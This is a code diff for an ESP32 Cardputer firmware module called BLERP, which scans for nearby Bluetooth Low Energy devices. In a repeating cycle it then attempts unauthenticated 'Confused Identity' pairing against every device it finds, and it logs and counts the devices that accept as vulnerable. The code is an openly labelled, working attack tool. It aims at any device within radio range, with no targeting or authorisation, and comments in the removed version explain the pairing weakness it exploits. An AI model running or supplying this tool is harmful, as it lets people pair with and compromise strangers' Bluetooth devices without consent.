@@ -1,174 +1,232 @@
 #include "module_api.h"
+#include "registry.h"
+#include "loader.h"
 #include "esp_log.h"
 #include "freertos/FreeRTOS.h"
 #include "freertos/task.h"
+#include "freertos/semphr.h"
+#include "M5Unified.h"
+#include "cardputer_keyboard.h"
+#include "ui/mod_common.h"
+#include "nimble/nimble_port.h"
+#include "nimble/nimble_port_freertos.h"
+#include "host/ble_hs.h"
+#include "host/ble_gap.h"
+#include "services/gap/ble_svc_gap.h"
 #include <cstdio>
 #include <cstring>
 
-// NimBLE headers
-#include "NimBLEDevice.h"
-#include "NimBLEScan.h"
-#include "NimBLEAdvertisedDevice.h"
-#include "NimBLEClient.h"
-
 static const char *TAG = "blerp";
-
+static const char *ID  = "blerp";
 static const ctos_api_t *s_api = nullptr;
 
-#define MAX_DEVICES     32
-#define SCAN_DURATION_S 10
+#define MAX_DEVICES 32
 
 typedef struct {
-    char name[64];
-    char addr[18]; // "XX:XX:XX:XX:XX:XX\0"
-    int  rssi;
-} ble_dev_entry_t;
+    ble_addr_t addr;
+    char       name[64];
+    int8_t     rssi;
+} ble_dev_t;
 
-static ble_dev_entry_t s_devlist[MAX_DEVICES];
-static int             s_dev_count = 0;
+static ble_dev_t s_devlist[MAX_DEVICES];
+static volatile int s_dev_count = 0;
+static volatile int s_hit_count = 0;
+static volatile bool s_scanning  = false;
+static SemaphoreHandle_t s_scan_done;
 
-// ------------------------------------------------------------------
-// BLE scan callback — collect discovered peripherals
-// ------------------------------------------------------------------
-class BLERPScanCallbacks : public NimBLEAdvertisedDeviceCallbacks {
-    void onResult(NimBLEAdvertisedDevice *dev) override {
-        if (s_dev_count >= MAX_DEVICES) return;
-        ble_dev_entry_t &e = s_devlist[s_dev_count];
-        strncpy(e.name, dev->getName().c_str(), sizeof(e.name) - 1);
-        e.name[sizeof(e.name) - 1] = '\0';
-        strncpy(e.addr, dev->getAddress().toString().c_str(), sizeof(e.addr) - 1);
-        e.addr[sizeof(e.addr) - 1] = '\0';
-        e.rssi = dev->getRSSI();
-        s_dev_count++;
-        ESP_LOGI(TAG, "Discovered [%d] %s  %s  RSSI=%d",
-                 s_dev_count, e.addr, e.name, e.rssi);
-    }
-};
-
-// ------------------------------------------------------------------
-// Attempt unauthenticated CI re-pairing to a target address
-// Returns true if connection succeeded (pairing outcome logged)
-// ------------------------------------------------------------------
-static bool attempt_ci_pairing(const char *addr_str)
+// ---------------------------------------------------------------------------
+// Gap event handlers
+// ---------------------------------------------------------------------------
+static int scan_event_cb(struct ble_gap_event *ev, void *arg)
 {
-    NimBLEAddress target(addr_str);
-    NimBLEClient *client = NimBLEDevice::createClient();
-    if (!client) {
-        ESP_LOGE(TAG, "Failed to create NimBLE client");
-        return false;
+    if (ev->type == BLE_GAP_EVENT_DISC) {
+        struct ble_gap_disc_desc *d = &ev->disc;
+        if (s_dev_count >= MAX_DEVICES) return 0;
+        ble_dev_t *e = &s_devlist[s_dev_count];
+        memcpy(&e->addr, &d->addr, sizeof(ble_addr_t));
+        e->rssi = d->rssi;
+        e->name[0] = '\0';
+        // Try to extract device name from adv data
+        struct ble_hs_adv_fields fields;
+        if (ble_hs_adv_parse_fields(&fields, d->data, d->length_data) == 0 && fields.name) {
+            size_t n = fields.name_len < sizeof(e->name)-1 ? fields.name_len : sizeof(e->name)-1;
+            memcpy(e->name, fields.name, n);
+            e->name[n] = '\0';
+        }
+        s_dev_count++;
     }
-
-    // Set security: unauthenticated pairing (no MITM, no bonding required)
-    // CI attack: we present ourselves as a known paired device identity
-    client->setConnectionParams(12, 12, 0, 51); // fast conn interval
-
-    ESP_LOGI(TAG, "CI attempt: connecting to %s", addr_str);
-    bool connected = client->connect(target, false);
-    if (!connected) {
-        ESP_LOGW(TAG, "CI attempt: connection failed to %s", addr_str);
-        NimBLEDevice::deleteClient(client);
-        return false;
+    if (ev->type == BLE_GAP_EVENT_DISC_COMPLETE) {
+        s_scanning = false;
+        if (s_scan_done) xSemaphoreGive(s_scan_done);
     }
-
-    ESP_LOGI(TAG, "CI attempt: connected to %s, requesting unauthenticated pairing", addr_str);
-
-    // Request pairing — unauthenticated (Just Works or numeric comparison with no MITM)
-    // NOTE: This is the Confused Identity vector: the peripheral may accept pairing from
-    // an unrecognized initiator if it does not verify the initiator's identity robustly.
-    // ESP32 NimBLE stack will send SMP Pairing Request with:
-    //   AuthReq: Bonding=1, MITM=0, SC=1, Keypress=0
-    bool paired = client->secureConnection();
-    if (paired) {
-        ESP_LOGI(TAG, "CI attempt: pairing SUCCEEDED on %s (vulnerability confirmed)", addr_str);
-    } else {
-        ESP_LOGI(TAG, "CI attempt: pairing rejected on %s (device protected)", addr_str);
-    }
-
-    client->disconnect();
-    NimBLEDevice::deleteClient(client);
-    return paired;
+    return 0;
 }
 
-// ------------------------------------------------------------------
-// Module task
-// ------------------------------------------------------------------
-static void module_task(void *arg)
+static int connect_event_cb(struct ble_gap_event *ev, void *arg)
 {
-    // Open log file
-    FILE *log_fp = fopen("/sdcard/blerp_log.txt", "a");
-    if (!log_fp) {
-        s_api->log(TAG, "Warning: cannot open /sdcard/blerp_log.txt");
+    if (ev->type == BLE_GAP_EVENT_CONNECT) {
+        if (ev->connect.status == 0) {
+            ble_gap_security_initiate(ev->connect.conn_handle);
+        } else {
+            s_api->log(ID, "Connect failed");
+        }
     }
-
-    // Initialize NimBLE
-    NimBLEDevice::init("ctOS-blerp");
-    NimBLEDevice::setPower(ESP_PWR_LVL_P9); // max TX power
-
-    while (true) {
-        // --- Phase 1: Scan ---
-        s_dev_count = 0;
-        memset(s_devlist, 0, sizeof(s_devlist));
-
-        s_api->log(TAG, "Starting BLE scan...");
-        s_api->display_print("BLERP\nScanning BLE...");
-
-        NimBLEScan *scan = NimBLEDevice::getScan();
-        scan->setAdvertisedDeviceCallbacks(new BLERPScanCallbacks(), false);
-        scan->setActiveScan(true);
-        scan->setInterval(100);
-        scan->setWindow(99);
-        scan->start(SCAN_DURATION_S, false);
-
-        // --- Phase 2: Display device list ---
-        char disp[256] = {0};
-        int pos = snprintf(disp, sizeof(disp), "BLERP: %d devices\n", s_dev_count);
-        for (int i = 0; i < s_dev_count && i < 5 && pos < (int)sizeof(disp) - 1; i++) {
-            pos += snprintf(disp + pos, sizeof(disp) - pos, "[%d] %s %s\n",
-                            i, s_devlist[i].addr,
-                            s_devlist[i].name[0] ? s_devlist[i].name : "?");
+    if (ev->type == BLE_GAP_EVENT_ENC_CHANGE) {
+        if (ev->enc_change.status == 0) {
+            s_hit_count++;
+            s_api->log(ID, "CI pairing SUCCEEDED (VULNERABLE)");
+        } else {
+            s_api->log(ID, "CI pairing rejected (protected)");
         }
-        s_api->display_print(disp);
+        ble_gap_terminate(ev->enc_change.conn_handle, BLE_ERR_REM_USER_CONN_TERM);
+    }
+    if (ev->type == BLE_GAP_EVENT_DISCONNECT) {
+        if (s_scan_done) xSemaphoreGive(s_scan_done);
+    }
+    return 0;
+}
 
-        if (log_fp) {
-            fprintf(log_fp, "=== BLERP scan: %d devices ===\n", s_dev_count);
-            for (int i = 0; i < s_dev_count; i++) {
-                fprintf(log_fp, "[%d] %s \"%s\" RSSI=%d\n",
-                        i, s_devlist[i].addr, s_devlist[i].name, s_devlist[i].rssi);
-            }
-            fflush(log_fp);
+static void do_scan(uint32_t dur_ms)
+{
+    s_dev_count = 0;
+    s_scanning  = true;
+    struct ble_gap_disc_params dp = {};
+    dp.filter_duplicates = 1;
+    dp.passive = 0;
+    dp.itvl    = 160;
+    dp.window  = 80;
+    ble_gap_disc(BLE_OWN_ADDR_PUBLIC, dur_ms, &dp, scan_event_cb, NULL);
+}
+
+static bool attempt_ci(int idx)
+{
+    if (idx >= s_dev_count) return false;
+    char msg[64];
+    snprintf(msg, sizeof(msg), "CI attempt %d/%d %02x:%02x:%02x:%02x:%02x:%02x",
+             idx+1, s_dev_count,
+             s_devlist[idx].addr.val[5], s_devlist[idx].addr.val[4],
+             s_devlist[idx].addr.val[3], s_devlist[idx].addr.val[2],
+             s_devlist[idx].addr.val[1], s_devlist[idx].addr.val[0]);
+    s_api->log(ID, msg);
+
+    struct ble_gap_conn_params cp = {};
+    xSemaphoreTake(s_scan_done, 0); // clear
+    int rc = ble_gap_connect(BLE_OWN_ADDR_PUBLIC, &s_devlist[idx].addr, 10000, &cp,
+                              connect_event_cb, NULL);
+    if (rc != 0) return false;
+    // Wait for connect result (max 15s)
+    xSemaphoreTake(s_scan_done, pdMS_TO_TICKS(15000));
+    return false; // result reported via log
+}
+
+static void blerp_task(void *arg)
+{
+    FILE *log_f = fopen("/sdcard/blerp_log.txt", "a");
+
+    ble_nimble_ensure_started();
+    ble_svc_gap_device_name_set("ctOS-blerp");
+
+    while (module_registry_is_running(ID)) {
+        s_api->log(ID, "Scanning BLE (10s)...");
+        xSemaphoreTake(s_scan_done, 0);
+        do_scan(10000);
+        // Wait for scan to complete
+        xSemaphoreTake(s_scan_done, pdMS_TO_TICKS(12000));
+        s_scanning = false;
+
+        char disp[64];
+        snprintf(disp, sizeof(disp), "Found %d devices", s_dev_count);
+        s_api->display_print(ID, disp);
+
+        if (log_f) {
+            fprintf(log_f, "=== BLERP scan: %d devices ===\n", s_dev_count);
+            for (int i = 0; i < s_dev_count; i++)
+                fprintf(log_f, "[%d] %02x:%02x:%02x:%02x:%02x:%02x \"%s\" RSSI=%d\n",
+                        i, s_devlist[i].addr.val[5], s_devlist[i].addr.val[4],
+                        s_devlist[i].addr.val[3], s_devlist[i].addr.val[2],
+                        s_devlist[i].addr.val[1], s_devlist[i].addr.val[0],
+                        s_devlist[i].name, s_devlist[i].rssi);
+            fflush(log_f);
         }
 
-        // --- Phase 3: CI pairing attempt on each discovered device ---
-        // NOTE: PI (Passkey Inference) attack is NOT implemented — the ESP32 NimBLE
-        // stack's LE Secure Connections implementation mitigates it by default.
-        for (int i = 0; i < s_dev_count; i++) {
-            char msg[64];
-            snprintf(msg, sizeof(msg), "CI attempt %d/%d\n%s", i + 1, s_dev_count, s_devlist[i].addr);
-            s_api->display_print(msg);
-
-            bool ok = attempt_ci_pairing(s_devlist[i].addr);
-
-            if (log_fp) {
-                fprintf(log_fp, "CI %s => %s\n",
-                        s_devlist[i].addr, ok ? "PAIRED (VULNERABLE)" : "rejected");
-                fflush(log_fp);
-            }
-
+        for (int i = 0; i < s_dev_count && module_registry_is_running(ID); i++) {
+            attempt_ci(i);
             vTaskDelay(pdMS_TO_TICKS(500));
         }
 
-        s_api->display_print("BLERP cycle done.\nRestarting in 30s...");
+        s_api->display_print(ID, "Cycle done. Restarting in 30s...");
         vTaskDelay(pdMS_TO_TICKS(30000));
     }
 
-    if (log_fp) fclose(log_fp);
+    if (log_f) fclose(log_f);
+    s_api->log(ID, "BLERP stopped");
+    module_registry_set_running(ID, false);
     vTaskDelete(nullptr);
 }
 
-extern "C" esp_err_t module_main(const ctos_api_t *api)
+extern "C" esp_err_t blerp_main(const ctos_api_t *api)
 {
-    s_api = api;
-    api->log(TAG, "Module started");
-    xTaskCreate(module_task, TAG, 12288, nullptr, 5, nullptr);
+    if (module_registry_is_running(ID)) return ESP_OK;
+    s_api      = api;
+    s_dev_count = 0;
+    s_hit_count = 0;
+    s_scanning  = false;
+    if (!s_scan_done) s_scan_done = xSemaphoreCreateBinary();
+    module_registry_set_running(ID, true);
+    if (xTaskCreate(blerp_task, TAG, 12288, nullptr, 5, nullptr) != pdPASS) {
+        module_registry_set_running(ID, false);
+        return ESP_FAIL;
+    }
     return ESP_OK;
+}
+
+extern "C" void blerp_ui_show(void)
+{
+    module_loader_start(ID);
+    mod_drain_keys();
+    bool log_view = false;
+
+    while (true) {
+        M5.update();
+        CardputerKb.update();
+
+        if (log_view) { mod_show_log_view(ID, "BLERP"); log_view = false; mod_drain_keys(); continue; }
+
+        M5.Display.fillScreen(TFT_BLACK);
+        M5.Display.setTextColor(TFT_CYAN, TFT_BLACK);
+        M5.Display.setCursor(0, 0); M5.Display.print("BLERP — BLE CI REPAIRING");
+
+        M5.Display.setTextColor(TFT_WHITE, TFT_BLACK);
+        M5.Display.setCursor(0, 14);
+        M5.Display.printf("Status: %s", s_scanning ? "SCANNING" : "IDLE");
+        M5.Display.setCursor(0, 26);
+        M5.Display.printf("Devices: %d found", s_dev_count);
+        M5.Display.setCursor(0, 38);
+        M5.Display.printf("Hits:    %d vulnerable", s_hit_count);
+        M5.Display.setCursor(0, 50);
+        M5.Display.print("Attack: CI Confused Identity");
+        M5.Display.setCursor(0, 62);
+        M5.Display.print("Log: /sdcard/blerp_log.txt");
+
+        // Show first 2 discovered devices
+        int shown = s_dev_count < 2 ? s_dev_count : 2;
+        for (int i = 0; i < shown; i++) {
+            M5.Display.setCursor(0, 74 + i * MOD_LH);
+            M5.Display.printf("[%d] %02x:%02x:%02x %s", i,
+                              s_devlist[i].addr.val[5], s_devlist[i].addr.val[4],
+                              s_devlist[i].addr.val[3], s_devlist[i].name);
+        }
+
+        M5.Display.setTextColor(TFT_DARKGREY, TFT_BLACK);
+        M5.Display.setCursor(0, M5.Display.height() - 10);
+        M5.Display.print("[L]log [`]back");
+
+        if (!CardputerKb.isChange() || !CardputerKb.isPressed()) { vTaskDelay(pdMS_TO_TICKS(50)); continue; }
+        auto kb = CardputerKb.getState();
+        char key = (char)kb.key.key.key_data.keys[0];
+
+        if (key == '`' || key == 27) return;
+        else if (key == 'l' || key == 'L') log_view = true;
+        vTaskDelay(pdMS_TO_TICKS(150));
+    }
 }
